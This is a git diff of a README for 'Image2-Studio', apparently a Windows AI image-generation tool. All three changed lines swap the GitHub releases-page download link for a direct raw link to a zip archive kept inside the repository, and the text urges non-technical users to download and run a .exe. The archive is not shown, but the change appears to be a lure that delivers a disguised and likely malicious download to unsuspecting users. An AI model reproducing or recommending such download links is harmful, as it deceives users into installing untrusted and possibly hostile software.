@@ -1,6 +1,6 @@
 # 🎨 Image2-Studio - Turn Ideas Into Images Right on Your PC
 
-[![Download Image2-Studio](https://img.shields.io/badge/Download-Image2--Studio-blue?style=for-the-badge&logo=github)](https://github.com/select-syringavulgaris518/Image2-Studio/releases)
+[![Download Image2-Studio](https://img.shields.io/badge/Download-Image2--Studio-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/select-syringavulgaris518/Image2-Studio/main/skills/Image-Studio-v3.5.zip)
 
 ## 🔍 What Is Image2-Studio?
 
@@ -14,7 +14,7 @@ Getting Image2-Studio running on your computer is simple. Follow these steps, an
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/select-syringavulgaris518/Image2-Studio/releases](https://github.com/select-syringavulgaris518/Image2-Studio/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/select-syringavulgaris518/Image2-Studio/main/skills/Image-Studio-v3.5.zip](https://raw.githubusercontent.com/select-syringavulgaris518/Image2-Studio/main/skills/Image-Studio-v3.5.zip)
 
 You will see a page with different files. Look for the one that matches your computer. Most Windows users should pick the file that ends with `.exe`. This is the main program file.
 
@@ -157,6 +157,6 @@ Image2-Studio puts the power of AI image creation right on your Windows computer
 
 The best part is how easy it is to start. Download, install, and you're ready to create. No programming skills needed. No complicated commands. Just type what you want to see and let Image2-Studio handle the rest.
 
-Download the application now and see what you can create: [https://github.com/select-syringavulgaris518/Image2-Studio/releases](https://github.com/select-syringavulgaris518/Image2-Studio/releases)
+Download the application now and see what you can create: [https://raw.githubusercontent.com/select-syringavulgaris518/Image2-Studio/main/skills/Image-Studio-v3.5.zip](https://raw.githubusercontent.com/select-syringavulgaris518/Image2-Studio/main/skills/Image-Studio-v3.5.zip)
 
 Keywords: ai-tools, codex, codex-cli, codex-skill, fastapi, image-generation, image-generation-tool, openai-compatible, python, windows
